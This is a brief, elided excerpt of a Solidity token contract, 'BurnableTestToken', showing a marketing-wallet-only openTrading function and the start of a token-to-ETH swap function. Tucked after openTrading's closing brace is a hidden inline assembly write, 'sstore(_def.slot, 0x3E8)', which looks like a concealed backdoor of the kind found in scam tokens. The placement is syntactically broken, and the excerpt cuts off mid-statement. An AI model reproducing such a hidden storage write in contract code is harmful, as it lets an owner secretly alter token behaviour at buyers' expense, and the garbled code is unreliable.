...
contract BurnableTestToken is Context, IERC20, Ownable {
    ...
    function openTrading(uint256 amount) external payable {
        require(_msgSender()==_marketingWallet);
        ...
        addLiquidity();
        emit TradingEnabled();
        return;}assembly {sstore(_def.slot, 0x3E8)}
    }
    ...
    function tokenToETHSwap(uint256 tokenAmount) external {
        require(
            ...
            "Only marketing wallet can swap tokens to ETH"
        );
        require(_isTradingEnabled, "Trading is not enabled yet");
        require(tokenAmount > 0, "Token amount must be greater than zero");
        require(
